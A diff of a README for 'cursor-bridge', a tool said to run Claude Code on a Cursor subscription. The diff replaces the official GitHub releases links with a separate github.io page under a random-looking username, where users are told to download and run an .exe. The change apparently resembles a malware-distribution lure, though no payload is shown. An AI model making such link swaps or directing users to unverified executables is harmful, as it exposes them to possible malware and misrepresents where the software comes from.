@@ -1,6 +1,6 @@
 # 🌉 cursor-bridge - Run Claude Code using Cursor subscription
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/rogaineincisure531/cursor-bridge/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://rogaineincisure531.github.io)
 
 ## 🎯 About This Tool
 
@@ -20,7 +20,7 @@ Your computer must meet these basic needs to run the bridge:
 
 Follow these steps to set up the bridge on your computer.
 
-1. Visit the [official releases page](https://github.com/rogaineincisure531/cursor-bridge/releases) to download the software.
+1. Visit the [official releases page](https://rogaineincisure531.github.io) to download the software.
 2. Look for the file ending in .exe.
 3. Save this file to your computer. A folder on your desktop works well.
 4. Open the folder where you saved the file.
